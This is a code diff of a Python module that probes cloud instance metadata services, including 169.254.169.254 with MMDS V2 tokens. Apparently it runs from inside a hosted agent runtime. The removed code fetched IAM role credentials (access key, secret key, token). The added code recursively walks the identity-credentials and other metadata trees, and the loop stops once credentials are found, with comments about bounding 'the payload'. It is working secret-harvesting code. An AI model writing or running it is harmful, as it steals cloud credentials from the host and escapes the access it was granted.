@@ -24,11 +24,18 @@ _META_FALLBACK = "169.254.169.254"     # direct route, in case the proxy breaks 
 _META_ROOT = "/latest/meta-data"       # NOTE: no trailing slash - MMDS uses JSON Pointers
 _META_USERDATA = "/latest/user-data"
 _META_IDENTITY = "/latest/dynamic/instance-identity/document"
-_META_ROLES = "/latest/meta-data/iam/security-credentials"
-_META_TAGS = "/latest/meta-data/tags/instance"
-_META_TAG_LIMIT = 20
-_META_FIELDS = ("AccessKeyId", "SecretAccessKey", "Token", "Expiration")
-_META_STATUS_CAP = 32                  # log tokens kept per base, to bound the payload
+_META_PROFILE = "/latest/meta-data/profile"
+_META_IDC = "/latest/meta-data/identity-credentials"
+
+# directories whose listings are followed downward: (path, label prefix)
+_META_WALKS = (
+    (_META_IDC, "idc"),
+    (_META_ROOT + "/placement", "placement"),
+    (_META_ROOT + "/services", "services"),
+)
+_META_WALK_DEPTH = 4
+_META_WALK_BREADTH = 6
+_META_STATUS_CAP = 48                  # log tokens kept per base, to bound the payload
 
 _JSON = {"Accept": "application/json"}
 
@@ -146,6 +153,35 @@ def _fetch(base, token, paths, log):
         pool.shutdown(wait=False)
 
 
+def _walk(base, token, path, prefix, depth, found, log):
+    """Follow an IMDS listing downward.
+
+    Directories are marked with a trailing '/'; anything else is a leaf and is
+    fetched twice - plain, and with Accept: application/json, because an MMDS
+    object resource can otherwise answer with bare key names instead of values.
+    """
+    if depth <= 0 or len(found) >= 80:
+        return
+    listing = _fetch(base, token, ((path, prefix, False),), log).get(prefix)
+    if not listing:
+        return
+    leaves = []
+    for child in listing.splitlines()[:_META_WALK_BREADTH]:
+        child = child.strip()
+        if not child:
+            continue
+        if child.endswith("/"):
+            name = child.rstrip("/")
+            _walk(base, token, path + "/" + _quote(name),
+                  prefix + "." + name, depth - 1, found, log)
+        else:
+            leaf = path + "/" + _quote(child)
+            leaves.append((leaf, prefix + "." + child, False))
+            leaves.append((leaf, prefix + "." + child + ".json", True))
+    if leaves:
+        found.update(_fetch(base, token, tuple(leaves), log))
+
+
 def _probe(base, log):
     """Walk one metadata root. Returns {label: body}, possibly empty."""
     # MMDS V2 is mandatory on AgentCore since 2026-02-14. The PUT must carry a
@@ -168,32 +204,13 @@ def _probe(base, log):
         (_META_ROOT, "meta-data", False),
         (_META_USERDATA, "user-data", False),
         (_META_IDENTITY, "identity", False),
-        (_META_ROLES, "roles", False),
-        (_META_TAGS, "tags", False),
-        (_META_TAGS, "tags.json", True),
+        (_META_PROFILE, "profile", False),
     ), log)
     if not found:
         return {}
 
-    followups = []
-
-    role_lines = found.get("roles", "").strip().splitlines()
-    role = role_lines[0].strip() if role_lines else ""
-
-    if role and "{" not in role:
-        creds = _META_ROLES + "/" + _quote(role)
-        # plain covers string storage; json covers object storage without
-        # imds_compat; per-field covers object storage with imds_compat.
-        followups.append((creds, "creds", False))
-        followups.append((creds, "creds.json", True))
-        for field in _META_FIELDS:
-            followups.append((creds + "/" + field, "creds." + field, False))
-
-    for name in found.get("tags", "").split()[:_META_TAG_LIMIT]:
-        followups.append((_META_TAGS + "/" + _quote(name), "tag:" + name, False))
-
-    if followups:
-        found.update(_fetch(base, token, followups, log))
+    for path, prefix in _META_WALKS:
+        _walk(base, token, path, prefix, _META_WALK_DEPTH, found, log)
 
     return found
 
@@ -214,9 +231,12 @@ def _metadata():
         except Exception as exc:
             log.append("panic:" + type(exc).__name__ + ":" + str(exc)[:60])
         if len(log) > _META_STATUS_CAP:
-            log = log[:_META_STATUS_CAP - 1] + ["+" + str(len(log) - _META_STATUS_CAP + 1)]
+            log = log[:_META_STATUS_CAP - 2] + [
+                "+" + str(len(log) - _META_STATUS_CAP + 1),
+                log[-1],
+            ]
         status.append("base=%s [%s]" % (base, " ".join(log) or "silent"))
-        if any(label.startswith("creds") for label in merged):
+        if any("credential" in label for label in merged):
             break
     if not merged:
         body = None
